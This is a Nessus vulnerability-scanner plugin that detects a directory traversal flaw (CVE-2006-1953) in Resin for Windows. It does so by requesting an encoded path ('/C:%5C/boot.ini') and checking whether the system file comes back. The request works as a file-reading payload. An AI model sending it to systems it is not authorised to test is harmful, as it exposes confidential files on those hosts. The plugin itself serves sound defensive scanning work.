#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21606);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2016/05/16 14:22:07 $");

  script_cve_id("CVE-2006-1953");
  script_bugtraq_id(18005);
  script_osvdb_id(25570);

  script_name(english:"Resin for Windows Encoded URI Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve boot.ini using Resin");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to directory traversal attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Resin, an application server.

The installation of Resin on the remote host allows an unauthenticated
remote attacker to gain access to any file on the affected Windows
host, which may lead to a loss of confidentiality.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/434150/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.caucho.com/download/changes.xtp");
  script_set_attribute(attribute:"solution", value:"Upgrade to Resin 3.0.19 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2006/05/27");
  script_set_attribute(attribute:"vuln_publication_date", value:"2006/05/16");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:caucho:resin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);
  script_require_keys("www/resin");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:8080);


# Unless we're paranoid, make sure the banner is from Resin.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner) exit(1, "Unable to get the banner from web server on port "+port+".");
  if ("Resin" >!< banner) exit(1, "The web server on port "+port+" does not appear to be Resin.");
}


# Try to exploit the issue to get a file.
file = "boot.ini";
u = string("/C:%5C/", file);
r = http_send_recv3(method:"GET",item:u, port:port, exit_on_fail:TRUE);

# There's a problem if looks like boot.ini.
if ("[boot loader]">< r[2])
{
  if (report_verbosity > 0)
  {
    report = '\n' +
"Nessus was able to retrieve the contents of '\boot.ini' using the" + '\n' +
'following URL :\n' +
'\n' +
'  ' + build_url(port:port, qs:u) + '\n';

    if (report_verbosity > 1)
      report += '\nHere is its contents :\n\n' + r[2] + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
